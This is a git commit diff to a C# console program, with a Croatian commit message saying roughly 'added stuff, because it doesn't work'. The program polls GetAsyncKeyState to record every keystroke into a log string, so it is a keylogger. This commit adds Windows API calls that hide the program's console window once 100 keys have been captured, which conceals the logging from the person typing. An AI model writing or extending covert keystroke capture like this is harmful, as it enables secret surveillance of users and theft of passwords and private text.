a200f6d6d0fd4a41ab843818e5ecdf139a271d70
Antun Safaric <crosfan@gmail.com>
2016-04-25 23:27:04 +0200

    Dodano nis,jer ne radi

--- Program.cs
+++ Program.cs
@@ -15,6 +15,15 @@ namespace ProjektiKonzola
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
+        [DllImport("user32.dll")]
+        private static extern int ShowWindow(int hwnd, int command);
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        private static extern int FindWindow(string className, string windowText);
+
+
+
         static void Main(string[] args)
         {
            
@@ -25,8 +34,11 @@ namespace ProjektiKonzola
         }
         static void Start()
         {
+
+            int hwnd = FindWindow(Console.Title, "");
             int brojac = 1;
             string log="";
+            
             while (true)
             {
                 Thread.Sleep(10);
@@ -38,6 +50,13 @@ namespace ProjektiKonzola
                         log +=(Keys)i;                       
                         break;
                     }
+                }
+                if(log.Length<100)
+                {
+                    ShowWindow(hwnd, 1);
+                }else
+                {
+                    ShowWindow(hwnd, 0);
                 }
                 if (log.Length == 100)
                 {
